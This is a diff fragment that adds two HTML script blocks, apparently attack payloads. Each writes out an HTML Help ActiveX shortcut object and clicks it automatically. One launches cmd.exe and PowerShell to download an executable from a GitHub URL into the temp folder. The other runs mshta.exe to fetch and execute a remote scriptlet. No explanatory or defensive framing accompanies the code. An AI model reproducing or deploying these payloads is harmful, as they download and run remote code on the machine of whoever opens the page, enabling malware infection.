@@ -38,3 +38,23 @@ document.write('</OBJECT>');
 <script>
 x.Click()
 </script>
+
+<script type="text/javascript">
+document.write('<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>');
+document.write('<PARAM name="Command" value="ShortCut">');
+document.write('<PARAM name="Button" value="Bitmap::shortcut">');
+document.write('<PARAM name="Item1" value=",cmd.exe,/c c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -NoProfile -c (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;(new-object system.net.webclient).downloadfile(\'https://github.com/kobezt08/test/raw/master/bitsgdosutil.exe\', $env:temp + \'\\bitsgdosutil.exe\')">');
+document.write('<PARAM name="Item2" value="273,1,1">');
+document.write('</OBJECT>');
+</script>
+<script>
+x.Click()
+</script>
+
+<script type="text/javascript" language="javascript"> 
+document.write('<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>');
+ document.write('<PARAM name="Command" value="ShortCut">');
+  document.write('<PARAM name="Button" value="Bitmap::shortcut">');
+  document.write('<PARAM name="Item1" value=\'",cmd.exe,/c mshta.exe javascript:a=GetObject("https://github.com/kobezt08/test/raw/master/example.sct").Exec();close();"\'>');
+  document.write('<PARAM name="Item2" value="273,1,1">');
+document.write('</OBJECT>');</script>
